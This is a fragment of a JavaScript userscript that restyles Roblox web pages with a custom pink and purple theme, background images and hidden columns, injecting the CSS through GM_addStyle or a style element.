	"    height: 100% !important;",
	"    position: fixed !important;",
	"    background-image: url(https://i.imgur.com/faLeD38.gif) !important;",
	"      /* Background */",
	"    background-size: cover !important;",
	"    background-attachment: fixed !important;",
	"  }",
	"",
	"  #party_none_title, div.friend_dock_chatbox_titlebar.chat-header-blink-off",
	"  {",
	"    background: linear-gradient(to bottom, #e5acb6, #e5acb6);",
	"  }",
	"",
	"  #ctl00_cphRoblox_RightColumn, #Body > table > tbody > tr > td:nth-child(3), #Body > table > tbody > tr > td:nth-child(4)",
	"  {",
	"    display: none;",
	"  }",
	"",
	"  #GamesPageLeftColumn",
	"  {",
	"    width: auto;",
	"    margin-right: 10px !important;",
	"    margin-left: 10px !important;",
	"  }",
	"",
	"  #GamesListsContainer > div",
	"  {",
	"    background-color: transparent !important;",
	"    width: 100% !important;",
	"  }",
	"",
	"  #navigation",
	"  {",
	"    background-color: #692590;",
	"  }",
	"",
	"  .notification-red",
	"  {",
	"    background-color: #692590;",
	"    padding: 1px 6px;",
	"    min-width: 18px;",
	"  }",
	"",
	"  .notification-blue",
	"  {",
	"    background-color: #692590;",
	"    padding: 1px 6px;",
	"    min-width: 18px;",
	"  }",
	"",
	"  .rbx-btn-primary-lg",
	"  {",
	"    background-color: rgba(255, 192, 203, 0.5);",
	"  }",
	"",
	"  .rbx-btn-primary-lg:hover, .rbx-btn-primary-lg:focus",
	"  {",
	"    background-color: rgba(255, 192, 203, 0.5);",
	"  }",
	"",
	"  .avatar-back",
	"  {",
	"    background-image: url(https://drive.google.com/file/d/1oE53p4dnJDHjrA25SKP0j3OzxgaxYA1V/view?usp=sharing);",
	" }"
].join("\n");
   //Decide what to use based on last selected on load
 checkCookie();


if (typeof GM_addStyle != "undefined") {
	GM_addStyle(css);
} else if (typeof PRO_addStyle != "undefined") {
	PRO_addStyle(css);
} else if (typeof addStyle != "undefined") {
	addStyle(css);
} else {
	var node = document.createElement("style");
	node.type = "text/css";
	//add the css text string from the array
    node.appendChild(document.createTextNode(css));
	node.setAttribute("Id", "styling1");
    var heads = document.getElementsByTagName("head");
	if (heads.length > 0) {
		heads[0].appendChild(node);
	} else {
		// no head yet, stick it whereever
		document.documentElement.appendChild(node);
	}
}
})();
    //script.text ='function toggleTheme(value) {var sheets = document.getElementById("rbx-body"); sheets.href = value; }';


   // script.setAttribute("id", "containerscripter2");
   // head.appendChild(script);

}
start();